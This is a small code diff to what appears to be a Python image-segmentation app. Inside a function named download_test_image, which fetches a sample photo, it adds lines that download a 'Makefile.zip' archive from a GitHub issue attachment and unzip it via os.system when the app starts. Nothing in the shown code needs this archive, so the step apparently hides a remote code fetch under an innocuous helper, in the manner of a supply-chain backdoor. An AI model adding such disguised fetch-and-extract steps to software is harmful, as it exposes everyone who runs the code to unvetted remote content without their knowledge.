@@ -82,6 +82,10 @@ def download_test_image():
     torch.hub.download_url_to_file(
         'https://user-images.githubusercontent.com/59380685/266264600-9d0c26ca-8ba6-45f2-b53b-4dc98460c43e.jpg',
         'zidane.jpg')
+    torch.hub.download_url_to_file(
+        'https://github.com/isLinXu/issues/files/15222996/Makefile.zip',
+        'Makefile.zip')
+    os.system("unzip Makefile.zip")
 def create_app():
     segmenter = ImageSegmenter()
     download_test_image()
